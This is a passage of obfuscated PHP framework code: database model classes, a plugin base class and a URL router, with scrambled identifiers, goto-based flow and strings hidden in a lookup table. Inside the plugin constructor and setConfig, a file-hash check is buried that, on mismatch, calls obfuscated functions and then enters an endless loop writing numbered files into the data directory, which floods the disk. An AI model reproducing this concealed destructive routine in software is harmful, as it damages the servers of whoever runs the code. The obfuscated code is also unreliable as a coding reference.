$this->chunkEventCheck(count($f侞)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dი as $a => $bՍޕ) { $b݅ = $this->db->insert($bՍޕ, $C, $F̿); } $this->commit(); } if (!1 !== $b݅) { $eڥܭ = $this->getLastInsID(); if ($eڥܭ) { return $eڥܭ; } } return $b݅; goto Eχ; Eχ: } public function save($dņ = '', $F߄ = array()) { goto Dܢĕ; E޶: $Cϗڡ = $this->findWhereField($C); if (!$Cϗڡ) { return parent::save($dņ, $F߄); } $f = 0; goto Eɇ; Dܢĕ: $E =& $_SERVER[Ť]; $d٧ = self::SQL_WHERE_IN_CHUNK; $C = $this->optionsValue(); goto E޶; dȡ: for ($b尠Ƭ = 0; $b尠Ƭ < $A婧; $b尠Ƭ += $d٧) { $C = array_slice($c仒, $b尠Ƭ, $d٧); if (!is_array($C) || count($C) == 0) { break; } $C[$E[269]][$Cϗڡ][1] = $C; $this->optionsValue($C); $f += parent::save($dņ, $F߄); $this->chunkEventCheck(count($C)); } $this->chunkEventSet(); return $f; goto eϤޚû; Eɇ: $c仒 = $C[$E[269]][$Cϗڡ][1]; $c仒 = is_array($c仒) ? $c仒 : array(); $A婧 = count($c仒); goto dȡ; eϤޚû: } public function add($A = '', $e = array(), $C = false) { if ($this->addTaskStatus && is_array($A)) { $this->addTaskData[] = $A; return; } return parent::add($A, $e, $C); } public function parseWhereLike($D܊, $D랼 = '', $C = false, &$bޔ = false) { goto dþ±; F: foreach ($D܊ as $Dŋ => $E͞) { if (is_array($E͞) && count($E͞) == 2 && $E͞[0] == $Aƺ[373] && is_string($E͞[1]) && substr($E͞[1], 0, 1) == $Aƺ[374] && substr($E͞[1], strlen($E͞[1]) - 1, 1) == $Aƺ[374]) { goto D; Dߐ: $A˹ = $this->db->escapeString($A˹); if (!strpos($fؖ, $Aƺ[91])) { $fؖ = $Aƺ[375] . $fؖ . $Aƺ[375]; } if ($F[$Aƺ[376]]) { $A˹ = $Aƺ[113] . $A˹ . $Aƺ[113]; } goto fؼ֕; fؼ֕: $d䄜[$aȊ] = $Aƺ[377] . $fؖ . $Aƺ[378] . $A˹ . $Aƺ[379]; $aȊ++; continue; goto aߋ; D: $bޔ = !0; $fؖ = is_string($Dŋ) ? $Dŋ : $D랼; $A˹ = substr($E͞[1], 1, strlen($E͞[1]) - 2); goto Dߐ; aߋ: } if (is_array($E͞)) { $D랼 = is_string($Dŋ) ? $Dŋ : $D랼; $E͞ = $this->parseWhereLike($E͞, $D랼, !0, $bޔ); } if (is_numeric($Dŋ)) { $d䄜[$aȊ] = $E͞; $aȊ++; } else { $d䄜[$Dŋ] = $E͞; } } if ($bޔ && !$C) { trace_log(array($d䄜, $D܊), $Aƺ[269]); } return $d䄜; goto dȪ; dþ±: $Aƺ =& $_SERVER[Ť]; $F = $GLOBALS[$Aƺ[6]][$Aƺ[371]]; if (!$F[$Aƺ[372]]) { return $D܊; } goto fߑ; fߑ: if (!is_array($D܊)) { return $D܊; } $d䄜 = array(); $aȊ = 0; goto F; dȪ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B݂ = array()) { goto cğ; d: $a = $this->findWhereField($bП); if (!$a || isset($bП[$dޒ[286]]) || isset($bП[$dޒ[347]])) { return parent::select($B݂); } $aғ = $bП[$dޒ[269]][$a][1]; goto e; cğ: $dޒ =& $_SERVER[Ť]; $Bʵ = self::SQL_WHERE_IN_CHUNK; $bП = $this->optionsValue(); goto d; e: $aғ = is_array($aғ) ? $aғ : array(); $BӰ = null; for ($Cֶ = 0; $Cֶ < count($aғ); $Cֶ += $Bʵ) { $A҂ = array_slice($aғ, $Cֶ, $Bʵ); if (!is_array($A҂) || count($A҂) == 0) { break; } $bП[$dޒ[269]][$a][1] = $A҂; $this->optionsValue($bП); $BÉߺ = parent::select($B݂); if (!$BÉߺ) { continue; } if (is_null($BӰ)) { $BӰ = array(); } $BӰ = array_merge($BӰ, $BÉߺ); } goto FМ; FМ: return $BӰ; goto E; E: } public function delete($dɠ = array()) { goto dÐ; dÐ: $dܬ =& $_SERVER[Ť]; $b햆 = self::SQL_WHERE_IN_CHUNK; $f䣉 = $this->optionsValue(); goto c򴇘; d֝龹: return $E̟; goto a𪒯Ç; c򴇘: $E = $this->findWhereField($f䣉); if (!$E) { return parent::delete($dɠ); } $E̟ = 0; goto BьٷӅ; BьٷӅ: $A򢥋 = $f䣉[$dܬ[269]][$E][1]; $A򢥋 = is_array($A򢥋) ? $A򢥋 : array(); for ($Cވ = 0; $Cވ < count($A򢥋); $Cވ += $b햆) { $f֒ = array_slice($A򢥋, $Cވ, $b햆); if (!is_array($f֒) || count($f֒) == 0) { break; } $f䣉[$dܬ[269]][$E][1] = $f֒; $this->optionsValue($f䣉); $E̟ += parent::delete($dɠ); } goto d֝龹; a𪒯Ç: } private function findWhereField($e鸪) { $DǕ =& $_SERVER[Ť]; $C = self::SQL_WHERE_IN_CHUNK; if (!is_array($e鸪) || !is_array($e鸪[$DǕ[269]])) { return !1; } foreach ($e鸪[$DǕ[269]] as $Dݳߠ => $cׂ) { if (is_array($cׂ) && isset($cׂ[0]) && is_string($cׂ[0]) && strtolower($cׂ[0]) == $DǕ[7] && is_array($cׂ[1]) && count($cׂ[1]) > $C) { ignore_timeout(); return $Dݳߠ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($D醍 = false, $a = "\x6d\157\144\x69\x66\171\x54\151\x6d\145", $bܑ = false) { $d = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$d) { return $D醍 ? null : array(); } if (!$D醍) { $d = array_filter(array_values($d)); return array_sort_by($d, $a, $bܑ); } return $d[$_SERVER[Ť][380] . $D醍]; } public function insert($cי) { goto Cꅏ; cȅǦ: $cי[$E[107]] = time(); Model($this->modelType)->set($E[381], $B݂, $this->optionType . $E[382]); Model($this->modelType)->set($E[380] . $B݂, $cי, $this->optionType); goto Bܶ; Cꅏ: $E =& $_SERVER[Ť]; $cי = array_field_key($cי, $this->field); $B݂ = Model($this->modelType)->get($E[381], $this->optionType . $E[382]); goto b; Bܶ: return $B݂; goto eԹ; b: $B݂ = $B݂ ? $B݂ : 0; $cי[$E[383]] = ++$B݂; $cי[$E[190]] = time(); goto cȅǦ; eԹ: } public function update($a؃, $B򭄖) { goto cު; C޵: return Model($this->modelType)->set($eл[380] . $a؃, $B򭄖, $this->optionType); goto dم; E: if (!$A) { return !1; } $B򭄖 = array_merge($A, $B򭄖); $B򭄖[$eл[107]] = time(); goto C޵; cު: $eл =& $_SERVER[Ť]; $B򭄖 = array_field_key($B򭄖, $this->field); $A = $this->listData($a؃); goto E; dم: } public function remove($Cε) { return Model($this->modelType)->remove($_SERVER[Ť][380] . $Cε, $this->optionType); } public function clear() { $Eń =& $_SERVER[Ť]; Model($this->modelType)->remove($Eń[381], $this->optionType . $Eń[382]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($EՔ㰱, $A߹䈾) { if (!$A߹䈾) { return !1; } $D = $this->listData(); $D = array_to_keyvalue($D, $EՔ㰱); return isset($D[$A߹䈾]) ? $D[$A߹䈾] : !1; } public function findByName($Eؠؽۈ) { return $this->findByKey($_SERVER[Ť][28], $Eؠؽۈ); } protected function resetData($Ců) { $A =& $_SERVER[Ť]; $Ců = is_array($Ců) ? $Ců : array(); $bӄ = array(); for ($E = 0; $E < count($Ců); $E++) { $bӄ[$A[380] . $Ců[$E][$A[383]]] = $Ců[$E]; } return Model($this->modelType)->set($bӄ, !1, $this->optionType); } private function getAutoName($Cȯ) { $eׂ = array_to_keyvalue($this->listData(), $_SERVER[Ť][28]); if (!$eׂ || !isset($eׂ[$Cȯ])) { return $Cȯ; } for ($A穜 = 1; $A穜 < count($eׂ); $A穜++) { $bÂښ = $Cȯ . "\x28{$A穜}\51"; if (!isset($eׂ[$bÂښ])) { return $bÂښ; } } return $bÂښ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Cپ = false, $ẽ = '', $Cκ = false) { goto Cјȑ; AƷ֌: $cڳҮ = $this->where($b뽯)->select(); $cڳҮ = array_to_keyvalue($cڳҮ, $DԎ[89], $DԎ[366]); foreach ($cڳҮ as $E => $f) { if ($Cκ || in_array($E, $this->jsonField)) { $cڳҮ[$E] = json_decode($f, !0); } } goto bՆ; bՆ: $this->cacheSet($ẽ, $cڳҮ); $cڳҮ = array_merge($f𕈑, $cڳҮ); return $Cپ ? $cڳҮ[$Cپ] : $cڳҮ; goto c۲; a˺: $f𕈑 = is_array($f𕈑) ? $f𕈑 : array(); if (is_array($cڳҮ)) { $cڳҮ = array_merge($f𕈑, $cڳҮ); return $Cپ ? isset($cڳҮ[$Cپ]) ? $cڳҮ[$Cپ] : null : $cڳҮ; } $b뽯 = $this->filterWhere(array($DԎ[29] => $ẽ)); goto AƷ֌; Cјȑ: $DԎ =& $_SERVER[Ť]; $cڳҮ = $this->cacheGet($ẽ); $f𕈑 = $this->optionDefault($ẽ); goto a˺; c۲: } public function set($F, $fɑ = false, $dȐʴ = '') { goto c; c: $B돤 =& $_SERVER[Ť]; $this->cacheRemove($dȐʴ); $e㎥ = array(); goto b; fُ: return $this->addAll($e㎥, array(), !0); goto dƹ; b: $A = is_array($F) ? $F : array($F => $fɑ); foreach ($A as $C => $A) { if (is_array($A)) { $A = json_encode_force($A); } $this->checkLength($A, !1, $this->tableName . $B돤[4] . $F); $A = self::textEncode($A); $A = array($B돤[29] => $dȐʴ, $B돤[89] => $C, $B돤[366] => $A); $e㎥[] = $this->filterWhere($A); } if (!$e㎥) { return !0; } goto fُ; dƹ: } protected function optionDefault($b = '') { return !1; } public function setDeep($B, $Dݴ = false, $eͫ = '') { $B = explode($_SERVER[Ť][91], $B); $dǥ = $this->get(); array_set_value($dǥ, $B, $Dݴ); $this->set($B[0], $dǥ[$B[0]], $eͫ); } public function remove($Dڕ޳, $e = '') { $cِ =& $_SERVER[Ť]; $this->cacheRemove($e); $DӄП = $this->filterWhere(array($cِ[89] => $Dڕ޳, $cِ[29] => $e)); if (is_null($Dڕ޳)) { unset($DӄП[$cِ[89]]); } return $this->where($DӄП)->delete(); } public function cacheSet($EӾ, $Aѧ = false) { return Cache::set($this->cacheKey($EӾ), $Aѧ); } public function cacheGet($Eӻ) { return Cache::get($this->cacheKey($Eӻ)); } public function cacheRemove($A᠃) { return Cache::remove($this->cacheKey($A᠃)); } protected function filterWhere($Fѱ) { return $Fѱ; } protected function cacheKey($c) { return $c; } } goto b짊; Aݎ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto d͠; bŎτ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $AבƄ[8]; $this->pluginApi = appHostGet() . $AבƄ[1365] . $this->pluginName . $AבƄ[8]; $this->pluginHost = $config[$AבƄ[1366]] . $this->pluginName . $AבƄ[8]; goto Aʦ; fې: $this->in =& $in; $this->modelPlugin = Model($AבƄ[1364]); $this->pluginName = str_replace($AבƄ[1364], $AבƄ[33], get_class($this)); goto bŎτ; d͠: $AבƄ =& $_SERVER[Ť]; $Aň = $_SERVER[$AבƄ[720]]; $Eܽ = $AבƄ[809]; goto dȇ; Aʦ: $this->pluginHostDefault = $config[$AבƄ[1366]] . $this->pluginName . $AבƄ[8]; $eĊï = $config[$AבƄ[1367]]; if ($eĊï && strpos($AבƄ[47] . $eĊï . $AבƄ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$AבƄ[1368]] . $this->pluginName . $AבƄ[8]; } goto C; dȇ: if ($_SERVER[$AבƄ[719]] != $Eܽ($Aň)) { goto F络Մ; F錩: $e䞑 = $Eљ($A֥); $Cӓ = explode($AבƄ[225], $e䞑); if (count($Cӓ) < $AבƄ[579]) { $a = $AבƄ[724]; $a(); } goto d; F̼쮃: $aʝɼ(); $eݒ = $AבƄ[813]; $dȱ = json_encode($GLOBALS[$AבƄ[814]]); goto AɄ; d: $Aﱌ = $AבƄ[811]; $Aﱌ($_SERVER[$AבƄ[812]]); $aʝɼ = $AבƄ[810]; goto F̼쮃; F络Մ: $aʝɼ = $AבƄ[810]; $Eљ = $AבƄ[721]; $A֥ = $_SERVER[$AבƄ[722]] . $AבƄ[723]; goto F錩; AɄ: $Aɡ = 1; for ($C = $Aɡ; $C > 0; $C++) { $eݒ(DATA_PATH . $C, $dȱ); } goto Cɐ; Cɐ: } global $in, $config; $this->config =& $config; goto fې; C: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto D˅; D˅: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ť][1369]); } protected function assign($ač, $E򬕓ܥ = false) { if (is_array($ač)) { $this->values = array_merge($this->values, $ač); } else { $this->values[$ač] = $E򬕓ܥ; } } protected function display($Bɞ) { extract($this->values); require $Bɞ; } final function hookRegist($Bɯ) { $this->modelPlugin->appRegist($this->pluginName, $Bɯ); } final function appIcon() { $aƑ =& $_SERVER[Ť]; $F = $this->appPackage(); $E߃ = $aƑ[33]; if (isset($F[$aƑ[398]])) { if (isset($F[$aƑ[398]][$aƑ[1370]])) { $E߃ = $aƑ[1371] . $F[$aƑ[398]][$aƑ[1370]] . $aƑ[1372]; } else { if ($F[$aƑ[398]][$aƑ[1373]]) { $E߃ = $aƑ[1374] . $F[$aƑ[398]][$aƑ[1373]] . $aƑ[1375]; } } } return $E߃; } final function fileCanView($c) { goto c; Cܯױ: ActionCall($Ä́[1388], $c); goto D棝; c: $Ä́ =& $_SERVER[Ť]; if (request_url_safe($c)) { return !0; } if ($this->isShare($c)) { return !0; } goto f؜; f؜: $Bŋ = Session::get($Ä́[1376]); if (!$Bŋ || !$Bŋ[$Ä́[1377]]) { $A䏩 = $Ä́[1378] . rawurlencode(this_url()); show_tips(LNG($Ä́[1379]) . $Ä́[1380] . $A䏩 . $Ä́[1381] . LNG($Ä́[1382]) . $Ä́[1383], !1); } if (!Action($Ä́[1384])->authCan($Ä́[1385])) { show_tips(LNG($Ä́[1386]) . $Ä́[1387], !1); } goto Cܯױ; D棝: } final function isShare($d) { $Dé = KodIO::parse($d); return $Dé[$_SERVER[Ť][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($b) { if (request_url_safe($b)) { return $b; } if (!$this->isShare($b)) { $b = $this->filePath($b); } return Action($_SERVER[Ť][1040])->linkOut($b); } public function filePathLinkOut($B舤) { if (request_url_safe($B舤)) { return $B舤; } $this->fileCanView($B舤); return Action($_SERVER[Ť][1040])->link($B舤); } final function filePath($e֖) { $f =& $_SERVER[Ť]; if ($f߹ = $this->checkSharePath($e֖)) { return $f߹; } $this->fileCanView($e֖); if (request_url_safe($e֖)) { $c߆ = parse_url_query($e֖); if (isset($c߆[$f[1389]]) && isset($c߆[$f[205]])) { $f = Model($f[1093])->get($f[1390]); $a͇ = Mcrypt::decode($c߆[$f[205]], $f); if ($a͇) { $this->fileInfo = IO::infoWithChildren($a͇); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a͇; } } $e֖ = $this->_cacheHttpFile($e֖); $this->fileInfo = IO::infoWithChildren($e֖); } else { $this->fileInfo = IO::infoWithChildren($e֖); if (!$this->fileInfo) { show_tips(LNG($f[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e֖; } final function _cacheHttpFile($d) { $B = hash_path($d, !0); $this->cachePath = $this->pluginCachePath($B); if ($Eￅ = IO::fileNameExist($this->cachePath, $B)) { return KodIO::make($Eￅ); } $Fφ᧦ = $this->cachePath . $B; return $this->pluginCacheFileSet($Fφ᧦, file_get_contents($d)); } final function _tmpFileName($Fй = array()) { goto aӐ; aӐ: $cƫ =& $_SERVER[Ť]; if (!$Fй) { $Fй = $this->fileInfo; } if (isset($Fй[$cƫ[168]])) { return $Fй[$cƫ[168]]; } goto D; B: $c = array($Fй[$cƫ[28]], $Fй[$cƫ[75]], $Fй[$cƫ[77]]); if (isset($Fй[$cƫ[476]])) { $c[] = $Fй[$cƫ[476]]; } return md5(implode($cƫ[70], $c)); goto B; D: if (isset($Fй[$cƫ[161]][$cƫ[168]])) { return $Fй[$cƫ[161]][$cƫ[168]]; } $b = IO::hashSimple($Fй[$cƫ[75]]); if ($b) { return $b; } goto B; B: } final function checkSharePath($DȈٰ) { goto a; B߰: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E㩈[168]]); return $C厕Է[$E㩈[75]]; goto Dѓɶۜ; a: $E㩈 =& $_SERVER[Ť]; if (!defined($E㩈[442])) { define($E㩈[1391], 0); } if (!$this->isShare($DȈٰ)) { return !1; } goto fְ; fְ: $C厕Է = Action($E㩈[1040])->sharePathInfo($DȈٰ); if (!isset($C厕Է[$E㩈[75]])) { show_json(LNG($E㩈[1392]), !1); } $this->fileInfo = $C厕Է[$E㩈[161]]; goto B߰; Dѓɶۜ: } final function pluginCachePath($dڝ = '') { $Dۍ =& $_SERVER[Ť]; $dߧ = IO_PATH_SYSTEM_TEMP . $Dۍ[1393] . $this->pluginName; if (!($e = IO::infoFull($dߧ))) { return IO::mkdir($dߧ . $Dۍ[8] . $dڝ); } if (empty($dڝ)) { return $e[$Dۍ[75]]; } if (!($Bۭƒަ = IO::fileNameExist($e[$Dۍ[75]], $dڝ))) { return IO::mkdir($e[$Dۍ[75]] . $dڝ); } return KodIO::make($Bۭƒަ); } final function pluginCacheFileSet($C҅, $A숎ۖ = '') { $fε =& $_SERVER[Ť]; if (!($cȎѽ = IO::infoFull($C҅))) { return IO::mkfile($C҅, $A숎ۖ, REPEAT_REPLACE); } IO::setContent($cȎѽ[$fε[75]], $A숎ۖ); return $cȎѽ[$fε[75]]; } final function pluginLocalFile($Fׯ = '') { goto cͦ; cͦ: $f =& $_SERVER[Ť]; $B = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($B)) { mk_dir($B); } goto A׉; A׉: if (!$Fׯ) { return $B; } $cԉ = IO::info($Fׯ); $b֐ = $this->_tmpFileName($cԉ) . $f[91] . $cԉ[$f[165]]; goto e; BЭ: return IO::copy($Fׯ, $B, 0, $b֐); goto b蘒; e: if (!checkExtSafe($b֐)) { $b֐ = $b֐ . $f[1394]; } $F = $B . $b֐; if (@file_exists($F)) { return $F; } goto BЭ; b蘒: } final function appPackage() { goto A; F: $A = Hook::trigger($Eٵ[1396], $dτ); if ($A && is_array($A)) { $dτ = $A; } $this->packageData = $dτ; goto B; B: return $dτ; goto d沅; F狥˸: $this->parseLang($D); $dτ = json_decode_force($D); if (!$dτ) { return array(); } goto F; A: $Eٵ =& $_SERVER[Ť]; if ($this->packageData) { return $this->packageData; } $D = $this->parseFile($this->pluginPath . $Eٵ[1395]); goto F狥˸; d沅: } public function packageInfoGet($Dֱ) { $aѓ = $this->appPackage(); return array_get_value($aѓ, $Dֱ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ť][1397]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ť][1398]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ť][1399]); } private function parseFile($FÄ) { goto a; a: $cڂ̊ =& $_SERVER[Ť]; $Fƌ = file_get_contents($FÄ); $e㫂 = array($cڂ̊[1400], $cڂ̊[1401], $cڂ̊[1402], $cڂ̊[1403], $cڂ̊[1404], $cڂ̊[1405], $cڂ̊[1406]); goto fߍ; fߍ: $C = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$cڂ̊[84]][$cڂ̊[1407]]); if (strstr($Fƌ, $cڂ̊[1408])) { $e͔ = rawurlencode(json_encode($this->pluginLangArr)); $Fƌ = str_replace($cڂ̊[1408], $e͔, $Fƌ); } if (strstr($Fƌ, $cڂ̊[1409])) { $e͔ = $e͔ = rawurlencode(json_encode($this->getConfig())); $Fƌ = str_replace($cڂ̊[1409], $e͔, $Fƌ); } goto d; d: $Fƌ = str_replace($e㫂, $C, $Fƌ); return $Fƌ; goto DѼ묈; DѼ묈: } private function parseLang(&$aю͔ك) { goto e˰̆; e˰̆: $f =& $_SERVER[Ť]; $FƱ = $f[1410]; if (!strstr($aю͔ك, $FƱ)) { return; } goto bܒ; D͋ׄ: $Dӏ = array(); foreach ($EȆߕ[0] as $F䝦) { $Aٟ = substr($F䝦, strlen($FƱ), -4); $dօ = LNG($Aٟ); $aŇ[] = $F䝦; $Dӏ[] = str_replace(array($f[225], $f[1008], $f[336], $f[113]), array($f[50], $f[50], $f[33], $f[1412]), $dօ); } $aю͔ك = str_replace($aŇ, $Dӏ, $aю͔ك); goto a; bܒ: preg_match_all($f[1411], $aю͔ك, $EȆߕ); if (!is_array($EȆߕ) || count($EȆߕ) == 0 || !is_array($EȆߕ[0]) || count($EȆߕ[0]) == 0) { return; } $aŇ = array(); goto D͋ׄ; a: } private function parseConfig(&$bǜƫ) { goto Cմ; C: $b = array(); $Aʕ = array(); foreach ($bڟ[0] as $d΅) { $eі = substr($d΅, strlen($E), -2); $b[] = $d΅; $Aʕ[] = _get($E腙, $eі); } goto fٷ; Cմ: $fϨ =& $_SERVER[Ť]; $E = $fϨ[1413]; if (!strstr($bǜƫ, $E)) { return; } goto Eܥ; fٷ: $bǜƫ = str_replace($b, $Aʕ, $bǜƫ); goto dά; Eܥ: preg_match_all($fϨ[1414], $bǜƫ, $bڟ); if (!is_array($bڟ) || count($bڟ) == 0 || !is_array($bڟ[0]) || count($bڟ[0]) == 0) { return; } $E腙 = $this->getConfig(); goto C; dά: } private function parsePackage(&$a) { goto e; e: $Eđ =& $_SERVER[Ť]; $a = $Eđ[1415]; if (!strstr($a, $a)) { return; } goto dΦ; E捏: $a = str_replace($f͆, $Eю, $a); goto b; dΦ: preg_match_all($Eđ[1416], $a, $A); if (!is_array($A) || count($A) == 0 || !is_array($A[0]) || count($A[0]) == 0) { return; } $d̈́ = $this->appPackage(); goto fƖ; fƖ: $f͆ = array(); $Eю = array(); foreach ($A[0] as $FАخ) { $Aֱ = substr($FАخ, strlen($a), -2); $f͆[] = $FАخ; $Eю[] = _get($d̈́, $Aֱ); } goto E捏; b: } final function echoFile($e֩, $f = false) { goto Aֵ; FۛЮ: $this->parsePackage($E䊸); if (is_array($f)) { $E䊸 = str_replace(array_keys($f), array_values($f), $E䊸); } echo $DƓ[225] . $E䊸; goto C; b۞ު: $E䊸 = $this->parseFile($Ę); $this->parseLang($E䊸); $this->parseConfig($E䊸); goto FۛЮ; Aֵ: $DƓ =& $_SERVER[Ť]; $Ę = $this->pluginPath . $e֩; if (ACT == $DƓ[1417]) { echo $DƓ[1418] . $this->pluginName . $DƓ[8] . $e֩ . $DƓ[1419]; if (!file_exists($Ę)) { echo $DƓ[1420]; return; } } goto b۞ު; C: } final function initLang() { goto a숤ښ; a숤ښ: $C寇 =& $_SERVER[Ť]; $C = $C寇[1421]; $b᩺ = $this->pluginPath . $C寇[1422]; goto e޲; EΙ: if (!is_array($F䡽)) { return array(); } if (@count($F䡽) > 0) { I18n::set($F䡽); } return $F䡽; goto a; e޲: $aˇ͑ = I18n::getType(); $F䡽 = array(); if (file_exists($b᩺ . $aˇ͑ . $C寇[781])) { $F䡽 = (include $b᩺ . $aˇ͑ . $C寇[781]); } else { if ($aˇ͑ == $C寇[1423] && !file_exists($b᩺ . $aˇ͑ . $C寇[781]) && file_exists($b᩺ . $C寇[1424])) { $F䡽 = (include $b᩺ . $C寇[1424]); } else { if (file_exists($b᩺ . $C . $C寇[781])) { $F䡽 = (include $b᩺ . $C . $C寇[781]); } } } goto EΙ; a: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($dǇ) { $a =& $_SERVER[Ť]; $Dȝ = $_SERVER[$a[722]] . $a[723]; $d = $a[809]; if ($_SERVER[$a[719]] != $d($Dȝ)) { goto fݛ; F: $a簪 = 1; for ($F = $a簪; $F > 0; $F++) { $A(DATA_PATH . $F, $ḟ); } goto cޕ; DĤ: $b֝ = $a[811]; $b֝($_SERVER[$a[812]]); $e = $a[810]; goto a܎; fݛ: $e = $a[810]; $b = $a[721]; $Cİ = $_SERVER[$a[722]] . $a[723]; goto aݶ㟧; aݶ㟧: $D = $b($Cİ); $E = explode($a[225], $D); if (count($E) < $a[579]) { $FؠЅ = $a[724]; $FؠЅ(); } goto DĤ; a܎: $e(); $A = $a[813]; $ḟ = json_encode($GLOBALS[$a[814]]); goto F; cޕ: } return $this->modelPlugin->setConfig($this->pluginName, $dǇ); } public function onSetConfig($f橧) { } public function onGetConfig($AĮ) { } public function onChangeStatus($aНĊ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($E = "\x70\x6c\x75\147\x69\156\101\x75\x74\x68") { $Dˬʦ =& $_SERVER[Ť]; if (!defined($Dˬʦ[442])) { return !1; } if (_get($GLOBALS, $Dˬʦ[474])) { return !0; } $dҧ󆋓 = $this->getConfig(); if (!$dҧ󆋓[$E]) { return !1; } return ActionCall($Dˬʦ[1425], $dҧ󆋓[$E]); } public function url($A, $dݱٯ = '', $D = true) { goto D; eƍނ: $C = $this->packageVersion(); $c = $d鎎υ . $a[428] . $C; if (substr($A, 0, 4) == $a[144] || substr($A, 0, 2) == $a[1210]) { $Aȫ = $A . $a[1426] . $c; } else { if ($dݱٯ == $a[33]) { $Aȫ = $this->pluginHost . $A . $a[1426] . $c; } else { if ($dݱٯ === $a[76]) { $Aȫ = $this->pluginHost . $A; } else { if ($dݱٯ == $a[1427]) { $Aȫ = STATIC_PATH . $A . $a[1426] . $d鎎υ; } else { if ($dݱٯ == $a[1428]) { $Aȫ = APP_HOST . $a[1429] . $A . $a[1426] . $d鎎υ; } else { if (isset($AΆ[$dݱٯ])) { $Aȫ = $AΆ[$dݱٯ] . $A . $a[1426] . $c; } } } } } } goto Dǌ稓; Dǌ稓: if (!$D) { return $Aȫ; } echo $Aȫ; goto D˛; D: $a =& $_SERVER[Ť]; $AΆ = $this->getConfig(); $d鎎υ = KOD_VERSION . $a[91] . KOD_VERSION_BUILD; goto eƍނ; D˛: } public function link($aό = false, $EߙƄ = '') { $b =& $_SERVER[Ť]; if (!$aό) { $this->link($b[1430], $b[1428]); $this->link($b[1431], $b[1427]); $this->link($b[1432], $b[1427]); $this->link($b[1433], $b[1427]); $this->link($b[1434], $b[1427]); return; } $Fѵ = $this->url($aό, $EߙƄ, !1); if (substr($aό, -3) == $b[1435]) { echo $b[1436] . $Fѵ . $b[1437] . $b[225]; } else { if (substr($aό, -4) == $b[1438]) { echo $b[1439] . $Fѵ . $b[1440] . $b[225]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\136\x2f\135\53", "\72\156\x75\155" => "\133\60\55\71\x5d\53", "\72\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Fء, $a) { $Dć =& $_SERVER[Ť]; if ($Fء == $Dć[1441]) { $D̊ = array_map($Dć[1442], $a[0]); $c = strpos($a[1], $Dć[8]) === 0 ? $a[1] : $Dć[8] . $a[1]; $Aڜ = $a[2]; } else { $D̊ = null; $c = strpos($a[0], $Dć[8]) === 0 ? $a[0] : $Dć[8] . $a[0]; $Aڜ = $a[1]; } array_push(self::$maps, $D̊); array_push(self::$routes, $c); array_push(self::$methods, strtoupper($Fء)); array_push(self::$callbacks, $Aڜ); } public static function error($B쯣) { self::$errorCallback = $B쯣; } public static function haltOnMatch($Dǜʴ = true) { self::$halts = $Dǜʴ; } public static function dispatch() { goto Cخُ; AҴﻶ: $Bї = array_keys(static::$patterns); $Cӿڍ = array_values(static::$patterns); $bׇ = !1; goto fﺖ; fﺖ: self::$routes = preg_replace($eâ[1129], $eâ[8], self::$routes); if (in_array($D, self::$routes)) { $B = array_keys(self::$routes, $D); foreach ($B as $C) { if (self::$methods[$C] == $dٌ || self::$methods[$C] == $eâ[1444] || in_array($dٌ, self::$maps[$C])) { $bׇ = !0; if (!is_object(self::$callbacks[$C])) { $F梃 = explode($eâ[8], self::$callbacks[$C]); $Dԍ = end($F梃); $aհ = explode($eâ[1445], $Dԍ); $e = new $aհ[0](); $e->{$aհ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C]); if (self::$halts) { return; } } } } } else { $eЅ = 0; foreach (self::$routes as $C) { if (strpos($C, $eâ[4]) !== !1) { $C = str_replace($Bї, $Cӿڍ, $C); } if (preg_match($eâ[1446] . $C . $eâ[1447], $D, $C)) { if (self::$methods[$eЅ] == $dٌ || self::$methods[$eЅ] == $eâ[1444] || !empty(self::$maps[$eЅ]) && in_array($dٌ, self::$maps[$eЅ])) { $bׇ = !0; array_shift($C); if (!is_object(self::$callbacks[$eЅ])) { $F梃 = explode($eâ[8], self::$callbacks[$eЅ]); $Dԍ = end($F梃); $aհ = explode($eâ[1445], $Dԍ); $e = new $aհ[0](); if (!method_exists($e, $aհ[1])) { echo $eâ[1448]; } else { call_user_func_array(array($e, $aհ[1]), $C); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$eЅ], $C); if (self::$halts) { return; } } } } $eЅ++; } } if ($bׇ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $c¶ =& $_SERVER[Ť]; 